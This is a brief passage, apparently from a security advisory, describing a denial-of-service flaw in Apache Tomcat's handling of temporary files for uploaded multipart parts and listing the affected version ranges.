Depending on JVM settings, application memory usage and application load, it was possible that space for the temporary copies of uploaded parts would be filled faster than GC cleared it, leading to a DoS.\n\n\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.11, from 10.1.0-M1 through 10.1.46, from 9.0.0.M1 through 9.0.109.\n\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100.
